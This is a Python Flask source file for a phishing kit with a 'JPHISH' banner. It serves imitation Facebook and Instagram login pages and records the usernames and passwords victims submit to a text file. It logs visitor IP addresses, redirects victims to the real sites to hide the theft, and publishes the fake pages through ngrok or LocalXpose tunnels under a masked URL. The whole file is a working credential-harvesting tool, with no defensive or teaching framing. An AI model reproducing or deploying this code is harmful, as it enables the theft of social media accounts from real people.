import os
import subprocess
import time
from datetime import datetime
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# ASCII Banner
def show_banner():
    print("""
     ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
     ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
     ██║██████╔╝███████║██║███████╗███████║
██   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
╚█████╔╝██║     ██║  ██║██║███████║██║  ██║
 ╚════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
    """)

# Log credentials and sessions
def log_credentials(username, password, service):
    with open('credentials.txt', 'a') as f:
        f.write(f"[{datetime.now()}] Service: {service}, Username: {username}, Password: {password}\n")

def log_session(ip, service):
    with open('sessions.log', 'a') as f:
        f.write(f"[{datetime.now()}] IP: {ip}, Visited: {service}\n")

# Phishing routes
@app.route('/')
def home():
    return render_template('login.html')

@app.route('/facebook', methods=['GET', 'POST'])
def facebook():
    if request.method == 'POST':
        username = request.form.get('email')
        password = request.form.get('pass')
        log_credentials(username, password, 'Facebook')
        return redirect("https://facebook.com")  # Redirect to real Facebook
    log_session(request.remote_addr, 'Facebook')
    return render_template('facebook.html')

@app.route('/instagram', methods=['GET', 'POST'])
def instagram():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        log_credentials(username, password, 'Instagram')
        return redirect("https://instagram.com")  # Redirect to real Instagram
    log_session(request.remote_addr, 'Instagram')
    return render_template('instagram.html')

# Check if Ngrok is running
def is_ngrok_running():
    try:
        result = subprocess.check_output(["pgrep", "ngrok"])
        return True
    except subprocess.CalledProcessError:
        return False

# Start Ngrok with error handling
def start_ngrok(auth_token, port=8080):
    try:
        if not is_ngrok_running():
            subprocess.Popen(["ngrok", "http", str(port), "--authtoken", auth_token, "--log=stdout"])
            time.sleep(5)  # Wait for Ngrok to initialize
            print("\n[+] Ngrok tunnel started successfully!")
        else:
            print("\n[!] Ngrok is already running.")
    except Exception as e:
        print(f"\n[!] Failed to start Ngrok: {e}")

# Main setup
def setup():
    show_banner()
    print("\n[+] Select Phishing Page:")
    print("1. Facebook")
    print("2. Instagram")
    choice = input("\nEnter choice (1/2): ").strip()

    use_localxpose = input("\nUse LocalXpose? (y/n): ").lower() == 'y'
    masked_url = input("\nEnter URL to mask (e.g., https://trusted-site.com): ").strip()

    if use_localxpose:
        localxpose_token = input("\nLocalXpose Auth Token: ").strip()
        subprocess.Popen(["localxpose", "http", "8080", "--to", masked_url, "--auth", localxpose_token])
    else:
        ngrok_token = input("\nNgrok Auth Token: ").strip()
        start_ngrok(ngrok_token)

    print(f"\n[+] Phishing page active! Masked URL: {masked_url}")

if __name__ == '__main__':
    setup()
    app.run(host='127.0.0.1', port=8080)
